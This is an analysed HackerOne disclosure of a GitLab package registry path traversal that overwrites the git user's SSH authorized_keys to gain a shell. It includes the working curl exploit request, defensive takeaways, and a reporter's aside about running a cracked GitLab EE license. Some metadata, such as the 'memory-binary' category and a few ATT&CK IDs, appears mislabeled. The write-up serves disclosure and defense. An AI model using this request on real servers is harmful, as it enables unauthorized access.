# Path Traversal in GitLab Package Registry API Leading to RCE

## Metadata
- **Source:** HackerOne
- **Report:** 733072 | https://hackerone.com/reports/733072
- **Submitted:** 2019-11-09
- **Reporter:** saltyyolk
- **Program:** GitLab
- **Bounty:** Not specified in writeup
- **Severity:** critical
- **Vuln:** Path Traversal, Arbitrary File Write, Remote Code Execution
- **CVEs:** None
- **Category:** memory-binary

## Summary
A path traversal vulnerability in the GitLab Package Registry Maven API endpoint allows authenticated attackers to write arbitrary files to any location writable by the git user. By exploiting this flaw to overwrite SSH authorized_keys, an attacker gains remote code execution with git user privileges on the GitLab server.

## Attack scenario
1. Attacker enables package registry on a GitLab instance (enabled by default)
2. Attacker creates a project and generates a private API token with appropriate permissions
3. Attacker crafts a PUT request to the Maven package API endpoint with path traversal sequences (%2e%2e%2f) in the URL
4. Attacker traverses the directory structure to reach /.ssh/authorized_keys file of the git user
5. Attacker uploads their public SSH key via the malicious request, overwriting the authorized_keys file
6. Attacker connects via SSH as git user and executes arbitrary commands with git privileges

## Root cause
The package registry API endpoint fails to properly validate and sanitize file paths before processing PUT requests, allowing encoded path traversal sequences to escape the intended package storage directory. The application constructs file paths from user-supplied input without adequate normalization or restriction checks.

## Attacker mindset
An attacker with valid API credentials (even basic user access) can escalate privileges by writing files outside the intended storage location. The use of URL encoding (%2e%2e%2f) to bypass naive path filters demonstrates understanding of input encoding bypasses. The choice to target SSH authorized_keys shows knowledge of Unix-based system administration and common privilege escalation vectors.

## Defensive takeaways
- Implement strict path canonicalization and validation for all file operations - decode and resolve paths to their absolute form before any access control checks
- Use allowlist-based validation for file paths, restricting writes to specific directories only
- Apply the principle of least privilege - run GitLab services with minimal required file system permissions
- Implement proper access controls on sensitive files like .ssh/authorized_keys with appropriate ownership and permissions
- Add comprehensive input validation and sanitization for all API endpoints handling file operations
- Conduct security code review of file handling logic in package registry implementations
- Implement file write integrity monitoring and logging for sensitive system paths
- Use containerization and sandboxing to limit damage from file write vulnerabilities

## Variant hunting
Similar vulnerabilities likely exist in other package registry formats (npm, pypi, etc.) if they share the same underlying file handling code. Check other API endpoints that accept file paths or package names. Investigate if directory traversal is possible in package metadata parsing. Look for similar patterns in artifact upload endpoints across different features.

## MITRE ATT&CK
- T1190
- T1001
- T1578
- T1098

## Notes
The vulnerability requires authentication but can be exploited by any user with API access. The proof-of-concept uses Docker networking (172.18.0.2) rather than exposed SSH ports. The reference to similar issue #732330 suggests this was part of a broader authentication bypass in GitLab's package handling. GitLab version affected: 12.4.2-ee. The use of --path-as-is curl flag is critical as it prevents automatic path normalization by the client.

## Full report
<details><summary>Expand</summary>

### Summary
This one is similar to #732330 but much simpler.
A path traversal issue in GitLab package registry API allow an attacker to write any file at any location writable to user git in a GitLab server.

### Steps to reproduce

1. Enable package registry in your GitLab instance.
2. Create a project (package registry is enabled by default)
3. Create a private token to call the API
4. Send the following request

```
curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
```
Then run `ssh git@10.26.0.5` to enjoy a shell.

### Examples

{F630231}

In my setup, I did't expose the 22 port of GitLab docker container, so I logged in the server with its docker IP, 172.18.0.2. In case there's any misunderstandings.

#### Results of GitLab environment info

```
$ gitlab-rake gitlab:env:info

System information
System:		
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	3.2.12
Git Version:	2.22.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.4.2-ee
Revision:	a3170599aa2
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.9
URL:		http://10.26.0.5
HTTP Clone URL:	http://10.26.0.5/some-group/some-project.git
SSH Clone URL:	git@10.26.0.5:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	10.2.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

```
# my docker-compose.yml
version: '3'
services:
  web:
    image: 'gitlab/gitlab-ee:latest'
    restart: always
    hostname: 'localhost'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://10.26.0.5'
        gitlab_rails['packages_enabled'] = true
    ports:
      - '10.26.0.5:80:80'
  #    - '10.26.0.5:22:22'
    volumes:
      - './config:/etc/gitlab'
      - './logs:/var/log/gitlab'
      - './data:/var/opt/gitlab'
      - ./crack/pub.pem:/opt/gitlab/embedded/service/gitlab-rails/.license_encryption_key.pub:ro
```
Please forgive me to use a crack on my self hosted testing purpose GitLab EE instance :)

## Impact

This path traversal issue could be easily exploited by overwriting some critical files related to server access. In my example I use authorized_keys of git user to enable the shell access for the attacker.

</details>

---
*Analysed by Claude on 2026-05-24*
